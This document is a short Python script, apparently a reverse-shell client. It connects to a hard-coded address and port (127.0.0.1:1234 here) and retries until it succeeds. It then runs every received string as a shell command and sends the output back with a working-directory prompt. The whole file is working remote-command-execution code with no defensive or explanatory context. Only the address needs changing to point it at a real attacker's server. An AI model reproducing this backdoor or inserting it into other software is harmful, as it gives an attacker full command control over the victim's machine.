#!/bin/python

import os
import subprocess
import socket
import time


class Client_Socket:
    def __init__(self, connect_to_address, connect_to_port):
        self.connect_to_address = connect_to_address
        self.connect_to_port = connect_to_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect_to_server()
        self.receive_commands()

    def connect_to_server(self):
        try:
            self.sock.connect((self.connect_to_address, self.connect_to_port))
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError, ConnectionError):
            time.sleep(5)
            self.connect_to_server()

    def receive_commands(self):
        while True:
            cmd = self.sock.recv(1024).decode()
            output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = output.stdout.read() + output.stderr.read()
            self.sock.send(output_bytes + '\n'.encode() + '['.encode() + os.getcwd().encode() + ']'.encode() + '$'.encode())


if __name__ == '__main__':
    test_socket = Client_Socket('127.0.0.1', 1234)
